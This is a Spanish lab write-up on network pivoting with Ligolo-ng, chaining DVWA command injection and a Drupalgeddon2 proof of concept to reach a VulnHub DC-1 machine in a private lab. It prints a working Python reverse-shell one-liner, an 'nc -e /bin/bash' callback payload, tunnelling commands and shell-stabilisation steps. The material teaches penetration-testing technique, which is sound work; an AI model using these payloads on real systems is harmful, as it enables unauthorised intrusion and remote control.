---
title: Cyberlab - Pivoting con Ligolo
date: 2024-12-15
categories: [Labs & CTF, Network Pivoting]
tags: [ligolo, pivoting, pentest, dvwa, hacking]
toc: true
---

## Objetivo

![Esquema del despliegue](/assets/img/posts/cyberlab_pivoting/20241215_140859_Untitled_Diagram.jpg)
_Esquema del despliegue_

El objetivo principal es utilizar Ligolo-ng para pivotar sobre las redes internas y poder explotar la máquina DC1 que no está accesible desde la máquina atacante.

El laboratorio consta de 4 máquinas:
- Kali Linux
- Ubuntu Server con DVWA levantado X2
- Debian 9 DC1

Para la descarga de DC1 o instalación de DVWA revisar los siguientes enlaces:

- [DVWA - Guía](https://github.com/digininja/DVWA)
- [DC1 - Descarga](https://www.vulnhub.com/entry/dc-1,292/)

Este entorno se ha desplegado en un servidor privado Proxmox pero su configuración en cuanto a redes puede ser similar en otros sistemas de virtualización como VMware o VirtualBox.

## Confirguración y comprobación inicial

### Redes privadas en Proxmox

Primero vamos a ver la configuración de redes que tenemos asignada en proxmox ya que en este caso no asignamos las ip mediante DHCP sino de forma manual y además cada red es privada.

![Configuración de redes](/assets/img/posts/cyberlab_pivoting/20241215_141817_Screenshot_from_2024-12-15_15-17-59.png)

Observamos cuatro redes configuradas donde "vmbr0" se trata de la configurada por defecto en proxmox y es un enlace puente al router local o gateway 192.168.100.1, que proporciona acceso a internet.

Todas las maquinas conectadas a este router seran visibles entre si por lo que hemos creado 3 redes privadas más en modo puente sin asignación de IP, gateway ni nada.

Posteriormente asignamos las IP a cada maquina de forma manual.

Entonces tenemos la siguiente asignación:

- Kali con interfaces vmbr0 y vmbr1 (vmbr0 solo si queremos acceso a internet)
- DVWA con interfaces vmbr1 y vmbr2
- DVWA 2 con interfaces vmbr2 y vmbr3
- DC1 con interfaz vmbr3

### Comprobación de visibilidad

![Comprobación](/assets/img/posts/cyberlab_pivoting/20241215_142534_Screenshot_from_2024-12-15_15-25-27.png)
_La máquina kali no es capaz de ver al objetivo DC1_

### Configuración en DVWA y DVWA 2

![DVWA](/assets/img/posts/cyberlab_pivoting/20241215_143045_Screenshot_from_2024-12-15_15-30-36.png)
_DVWA_

![DVWA 2](/assets/img/posts/cyberlab_pivoting/20241215_143118_Screenshot_from_2024-12-15_15-31-11.png)
_DVWA 2_

### Escucha en local

Para terminar con su configuración necesitamos establecer un servicio de escucha en los puertos 8000 de ambas máquinas como servicio web local, es decir que solo sea accesible desde la propia máquina.

![Apache config](/assets/img/posts/cyberlab_pivoting/20241215_143446_Screenshot_from_2024-12-15_15-34-42.png)
_Añadimos la linea "Listen 127.0.0.1:8000" en ambas máquinas DVWA_

Creamos el host virtual para atender las peticiones y su contenido.

![Virtual host](/assets/img/posts/cyberlab_pivoting/20241215_144109_Screenshot_from_2024-12-15_15-41-00.png)
_Creamos el archivo "001-internal.conf" en ambas máquinas_

```bash
sudo a2ensite 001-internal.conf

sudo systemctl reload apache2
```

Creamos un documento index.html con el siguiente contenido:

```bash
sudo nano index.html /var/www/internal
```

```html
<h1>SERVIDOR WEB INTERNO</h1>
<p>Servicio web solo disponible localmente desde localhost</p>
```

### Configuración DC1

En este caso en principio no tenemos acceso a DC1 por lo que no podemos modificar la configuración de red.  
Podemos establecer que en la red privada vmbr3 asgine IP de forma automática y esto deberia asignarle una a DC1.  
Otra opción es acceder de alguna forma a la máquina como root para configurar la dirección IP.  

Sea cual sea la opción la máquina debe quedar visible para DVWA 2 y no para las demás.

## Caso práctico

Imagina una red corporativa como una casa grande y complicada. Tú eres un investigador de seguridad (también llamado pentester) y tu objetivo es entrar en las habitaciones más importantes de esa casa, como la sala del tesoro o la sala de control.

Para entrar en estas habitaciones secretas, no puedes simplemente abrir la puerta principal. En su lugar, tienes que encontrar caminos alternativos, como ventanas abiertas, puertas traseras o conductos de ventilación. A esto se le llama "movimiento lateral".

En el mundo de la informática, estos caminos alternativos son las vulnerabilidades en los sistemas. Cada host en la red es como una habitación, y cada vulnerabilidad es como una puerta o ventana. Al explotar estas vulnerabilidades, puedes moverte de un host a otra hasta llegar a tu objetivo final.

Ligolo es una herramienta que te ayuda a abrir estas puertas y ventanas. Es como una llave maestra que te permite crear túneles secretos entre diferentes computadoras. Estos túneles te permiten moverte de un punto a otro de la red de forma segura y discreta.

En este laboratorio, se practican estas técnicas de movimiento lateral en un entorno controlado.

## Shell reversa y establecimiento de Ligolo-ng

### Shell reversa en DVWA

Para comenzar vamos a crear una shell reversa en nuestro punto de entrada que se trata de la primera máquina DVWA.

Para esto hacemos uso de cualquiera de las vulnerabilidades que permitan esto dentro de DVWA.

En este caso vamos a usar la inyección de comandos:

![Shell reversa](/assets/img/posts/cyberlab_pivoting/20241215_163127_Peek_2024-12-15_17-29.gif)

```bash
export RHOST="192.168.10.100";export RPORT=9000;nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'&
```

Se ha añadido el nohup en el payload para poder evitar que la interfaz web se quede inactiva y que desvincule el proceso de la shell de la aplicación web

![Puerto escucha](/assets/img/posts/cyberlab_pivoting/20241215_164504_2024-12-15_17-44.png)
_Enumeramos los puertos de escucha en DVWA y encontramos un servicio web y un servidor local en 8000 y 3306_

### Transferencia Ligolo

Para poder acceder a los servicios anteriormente vistos necesitamos hacer un local port forwarding y para ello vamos a utilizar ligolo-ng.

[Ligolo-ng en github](https://github.com/Nicocha30/ligolo-ng)

Descargamos la version que corresponda con la arquitectura del sistema, el agente y el proxy:

```bash
tar -xzf Ligolo-ng_agent.tar.gz
tar -xzf Ligolo-ng_proxy.tar.gz
```

Proxy: Este es el componente que se ejecuta en tu máquina atacante (como Kali). Actúa como un servidor, esperando conexiones de los agentes. Es el punto central de tu operación de pivotaje.

Agent: Este componente se ejecuta en la máquina objetivo que deseas comprometer. Se conecta al proxy y establece un túnel seguro, permitiendo que el tráfico de tu máquina atacante sea redirigido a través de esa máquina.

Por lo tanto vamos a tranferir el agent al objetivo:

![Transferencia agente](/assets/img/posts/cyberlab_pivoting/20241215_170829_Peek_2024-12-15_18-08.gif)

## Local Port-Forwarding con Ligolo

### Proxy server en kali

![Proxy setup](/assets/img/posts/cyberlab_pivoting/20241215_172342_2024-12-15_18-23.png)
_Ejecutar como sudo_

Esto crea una consola en la que podremos manejar varias sesiones dentro de nuestro C2.

El parámetro "-selfcert" indica que cree un certificado para el protocolo TLS.

Creamos además una interfaz nueva a la que llamaremos "cha-1" o "channel-1"

![Certificado](/assets/img/posts/cyberlab_pivoting/20241215_172551_2024-12-15_18-25.png)
_Creamos el certificado_

### Agente en DVWA

Antes de poder ejecutar el binario en el servidor hay que dar permisos de ejecución:

```bash
chmod +x agent
```

Ahora si podemos establecer la conexión con el C2 usando el siguiente comando:

![Conexión agente](/assets/img/posts/cyberlab_pivoting/20241215_172909_2024-12-15_18-29.png)
_Debemos indicar el certificado TLS que generamos antes para que acepte la conexión_

### Tunel hacia DVWA

![Sesión](/assets/img/posts/cyberlab_pivoting/20241215_180605_2024-12-15_19-06.png)
_Escribimos session y damos enter_

![Verificación interfaz](/assets/img/posts/cyberlab_pivoting/20241215_180711_2024-12-15_19-05.png)
_Con ifconfig verificamos la asignación de la interfaz cha-1 a la red que DVWA tiene compartida con DVWA 2_

![Configuración túnel](/assets/img/posts/cyberlab_pivoting/20241215_180822_2024-12-15_19-08.png)
_Indicamos todo el rango al que pertenece la red entre DVWA y DVWA 2 lo transmita a traves de es interfaz e iniciamos el tunel_

Nota*  
Si queremos redireccionar el tráfico local de la maquina DVWA para poder acceder al servicio en el puerto 8000 debemos hacer un "truco" que implementa lingolo.

[Wiki oficial](https://github.com/nicocha30/ligolo-ng/wiki/Localhost)

El truco es añadir una redirección tal y como acabamos de hacer a la interfaz cha-1 pero con la ip 240.0.0.0/4

Ligolo tiene una característica integrada que te permite acceder a los puertos locales de la máquina agente conectada. Esto se logra utilizando un rango de direcciones IP especial y no utilizado: 240.0.0.0/4.

Cuando intentas acceder a una dirección IP dentro de este rango especial (por ejemplo, 240.0.0.1), Ligolo intercepta el tráfico.

En lugar de enviar el tráfico a su destino normal, Ligolo lo redirige automáticamente a la dirección IP local de la máquina agente conectada (generalmente 127.0.0.1). Esto crea efectivamente un túnel directo a los servicios locales del agente.

![Redirección](/assets/img/posts/cyberlab_pivoting/20241215_181622_2024-12-15_19-16.png)
_Ahí podemos ver la redirección añadida a cha-1_

Si accedemos por lo tanto a la ruta donde levantamos el servicio en local:

![Acceso servicio web](/assets/img/posts/cyberlab_pivoting/20241215_182139_2024-12-15_19-21.png)
_Tenemos acceso a ese servicio web_

## Pivotando hacia DVWA 2

Ahora que ya tenemos creado el tunel hacia DVWA signifca que tenemos acceso a toda la red que comparte con DVWA 2 y, por lo tanto que podemos acceder a los servicios que ofrece DVWA 2.

Recordad que el tunel y la redirección ya esta activo y asignado por lo que ahora desde nuestro kali todo lo que hagamos apuntando a 192.168.15.0/24 pasará por el tunel hacia DVWA por lo que se hará en su red.

![Escaneo red](/assets/img/posts/cyberlab_pivoting/20241215_183914_Peek_2024-12-15_19-39.gif)
_Observamos que hay dos IP dentro de la red la 15.10 pertenece a DVWA y la 15.20 pertenece a DVWA 2_

Sabiendo esto podemos por lo tanto acceder al servicio en el puerto 80 de DVWA 2

![Preparación payload](/assets/img/posts/cyberlab_pivoting/20241215_191450_Peek_2024-12-15_20-14.gif)
_Lo dejamos preparado para volver a inyectar el payload_

### Conexión desde DVWA 2

Necesitamos el agente en DVWA 2 así que volvemos a su interfaz en 192.168.15.20 puerto 80 para crear la shell reversa

Antes de crear la shell debemos indicar en la sesión que tenemos con DVWA que todo lo que sea recibido por el puerto 11601 de cualquier ip sea redireccionado de forma local en nuestra kali al puerto 4444

![Redirección puertos](/assets/img/posts/cyberlab_pivoting/20250104_124719_2025-01-04_13-47.png)
_Creamos la redirección de puertos_

![Inyección payload](/assets/img/posts/cyberlab_pivoting/20250104_125035_Peek_2025-01-04_13-50.gif)
_Iniciamos la escucha en el puerto 4444 e inyectamos el payload de shell reversa en DVWA 2 teniendo en cuenta que debe apuntar a DVWA en el puerto donde ligolo está escuchando, 11601_

![Transferencia agente](/assets/img/posts/cyberlab_pivoting/20250104_125654_Peek_2025-01-04_13-56.gif)
_Ahora necesitamos transferir el agente desde DVWA 1 a DVWA 2. Una vez hecho, antes de conectar el agente es necesario cerrar la redirección de puertos en kali y crear una nueva como se ve en la imagen_

### Establecer el tunel hacia DVWA 2

Una vez tenemos la session necesitamos crear una nueva interfaz para poder asignar el rango de IP entre DVWA 2 y DC1, para posteriormente asignar el rango de ip y así tener visible DC1.

![Configuración túnel](/assets/img/posts/cyberlab_pivoting/20250104_130238_2025-01-04_14-02.png)
_Seleccionamos la sesion, creamos la interfaz, asignamos el rango de IP e iniciamos el tunel_

## Acceso y explotación a DC1

### Localización

Para poder localizar el objetivo DC1 haremos un escaneo de host:

```bash
nmap -F 192.168.20.0-50
```

![Escaneo hosts](/assets/img/posts/cyberlab_pivoting/20250104_130539_Peek_2025-01-04_14-05.gif)
_Vemos dos hosts DVWA 2 (192.168.20.10) y DC1 (192.168.20.20)_

### Explotación DC1

Tenemos el camino y vemos al objetivo, vamos a explotarlo.

Como ya sabemos DC1 cuenta con un servicio web Drupal que es vulnerable por lo que tras buscar por internet encontramos un PoC que nos puede servir.

[PoC Github](https://github.com/lorddemon/drupalgeddon2/blob/master/drupalgeddon2.py)

Ahora que tenemos el payload vamos de nuevo a nuestra sesion con DVWA 2 en ligolo para crear una redirección igual que hicimos antes, todo lo que venga del puerto 11601 que lo redireccione al 9001 en local.

```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:9001 --tcp 
```

![Configuración redirección](/assets/img/posts/cyberlab_pivoting/20250104_131556_2025-01-04_14-15.png)

Con esto listo vamos a explotar DC1 para ganar acceso. 

En los parámetros de druppalgeddon indicamos como objetivo la IP de DC1 y como escucha la IP que corresponde a DVWA 2 dentro de la red compartida con DC1 y el puerto 11601 ya que es donde tenemos el tunel con ligolo.

```bash
python3 druppalgeddon2.py -h http://192.168.20.20 -c 'nohup nc -e /bin/bash 192.168.20.10 11601 &'
```

![Explotación DC1](/assets/img/posts/cyberlab_pivoting/20250104_132007_Peek_2025-01-04_14-19.gif)

## Estabilización y escalada de privilegios

Una vez tengamos acceso a DC1 es momento de estabilizar nuestra linea de comandos para que sea más estable y nos permita realizar más acciones.

Para esto vamos a usar el siguiente proceso:

```bash
python -c 'import pty; pty.spawn('/bin/bash')'

export TERM=xterm

Pulsamos CTRL + Z

En kali : stty raw -echo; fg

Enter y luego enter de nuevo
```

![Shell estabilizada](/assets/img/posts/cyberlab_pivoting/20250104_133005_Peek_2025-01-04_14-28.gif)
_Ya tenemos la shell estabilizada y la primera flag_

Ahora vamos a escalar los privilegios. Como es una maquina que ya cuenta con muchas guias vamos a abreviar un poco.

Si ejecutamos algun programa como linpeas para obtener que privilegios y otros datos tenemos con el usuario www-data encontramos que el usuario puede ejecutar el binario find como administrador por lo que teniendo esto en cuenta vamos a hacer lo siguiente:

![Escalada privilegios](/assets/img/posts/cyberlab_pivoting/20250104_134114_Peek_2025-01-04_14-41.gif)